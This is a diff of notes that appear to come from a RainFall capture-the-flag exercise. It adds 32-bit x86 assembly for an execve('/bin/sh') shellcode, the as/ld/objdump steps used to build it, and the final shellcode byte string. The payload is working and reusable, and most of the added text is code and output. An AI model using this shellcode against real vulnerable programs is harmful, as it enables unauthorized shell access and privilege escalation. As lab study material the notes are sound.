@@ -322,3 +322,43 @@ level2@RainFall:/tmp$ echo $?
 ```
 noice
 ### Now the /bin/sh shellcode
+Need a way to call execve with argument "/bin/sh", **pushing it to stack ??**, **11** is the syscall number for execv
+```
+xor    %eax,%eax
+push   %eax
+push   $0x68732f2f
+push   $0x6e69622f
+mov    %esp,%ebx
+push   %eax
+push   %ebx
+mov    %esp,%ecx
+mov    $11,%al
+int    $0x80
+```
+getting opcode
+```
+level2@RainFall:/tmp$ as shell.s -o shell.o
+level2@RainFall:/tmp$ ld -o shell shell.o
+level2@RainFall:/tmp$ objdump -d shell
+
+shell:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048054 <_start>:
+ 8048054:       31 c0                   xor    %eax,%eax
+ 8048056:       50                      push   %eax
+ 8048057:       68 2f 2f 73 68          push   $0x68732f2f
+ 804805c:       68 2f 62 69 6e          push   $0x6e69622f
+ 8048061:       89 e3                   mov    %esp,%ebx
+ 8048063:       50                      push   %eax
+ 8048064:       53                      push   %ebx
+ 8048065:       89 e1                   mov    %esp,%ecx
+ 8048067:       b0 0b                   mov    $0xb,%al
+ 8048069:       cd 80                   int    $0x80
+```
+shellcode
+```
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
